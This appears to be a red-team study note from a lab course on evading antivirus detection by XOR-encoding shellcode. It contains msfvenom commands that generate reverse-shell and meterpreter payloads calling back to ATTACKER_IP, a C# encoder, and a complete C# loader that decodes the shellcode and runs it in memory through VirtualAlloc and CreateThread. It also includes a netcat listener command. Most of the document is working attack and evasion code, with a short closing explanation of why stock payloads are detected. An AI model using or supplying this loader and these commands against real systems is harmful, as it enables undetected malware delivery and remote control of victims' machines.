---
{"dg-publish":true,"permalink":"/cards/red-team/shellcode-encoding-and-encrypting/","tags":["red-team/host-evasion"]}
---

~ [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
### Introduction
---
This is the process of evading AV detection using encoding and encryption using public tools such as MSFVenom (won't work most likely) and custom code.

#### Key Topics
---

- [[#Encoding using MSFVenom|Shows how to use MSFvenom to generate and encode shellcode and explains why it's likely to be flagged by antivirus software.]]
    
- [[#Encoder|Demonstrates a custom C# XOR encoder that obfuscates shellcode and converts it to base64.]]
    
- [[#The decoder|Presents the decoding logic that reverses the encoding process and injects shellcode into memory using Windows API calls.]]
    
- [[#Questions and Problems|Analyzes why AV detects MSFvenom payloads even with XOR and how custom tools bypass this through variation and unpredictability.]]
## Prerequisites
---
- [[cards/red-team/shell code injection\|shell code injection]]
- [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
- [[cards/windows/Windows API\|Windows API]]

## Encoding using MSFVenom
---
This is a public tool will most likely get flagged or block by most AV vendors as soon as it touches the disk.

Proving this point:

```shell-session
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

Then compile it using the previous code by replacing the shellcode provided in the output then upload it to the antivirus checker:

![Shellcode Encoding and Encrypting.png](/img/user/cards/red-team/images/Shellcode%20Encoding%20and%20Encrypting.png)

Even encrypting with XOR still gets detected as AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected:

```C
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

Uploading it to virus checker:

![Shellcode Encoding and Encrypting-1.png](/img/user/cards/red-team/images/Shellcode%20Encoding%20and%20Encrypting-1.png)
## Encoder
---
Here is the payload we are going to use:

```C
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

Here is a sample code:

```csharp

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

Then compile and execute the encoder:

```C
csc.exe Encrypter.exe
.\Encrypter.exe
```

Output:

![Shellcode Encoding and Encrypting-2.png](/img/user/cards/red-team/images/Shellcode%20Encoding%20and%20Encrypting-2.png)

Once finished use the base64 encoded data and pass it to the `dataBs64` variable below:
### The decoder
---
This basically reverse the process of encoding starting from base64 -> Xoring the result using the same key:

```csharp

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
  }
}
```

Then compile the program:

```C
csc.exe EncStageless.cs
```

Before executing setup a netcat listener to listen for hacking:)

```C
nc -nvlp 443
```

Execute:

![Shellcode Encoding and Encrypting-3.png](/img/user/cards/red-team/images/Shellcode%20Encoding%20and%20Encrypting-3.png)
Then try to upload it to Antivirus.
### Questions and Problems
---
How do the MSFvenom encryption/encoding technique differs from this custom payload of ours? and how is it detected by AV when we use the same technique in this case XOR?


- AV engines has seen MSFvenom payloads thousands of times.
- Even **XOR-encrypted MSFvenom payloads** are predictable:
	- File structure (PE headers, import tables).
	- Metadata (sections, size, alignment).
	- Static artifacts inside stub or decoder logic.
- MSFvenom adds a small **decryptor stub** before running the payload.
- The stub is easily recognizable:

    - XOR loop is always the same.
    - Position and structure predictable.
    
- AV flags this **stub**, not just the payload.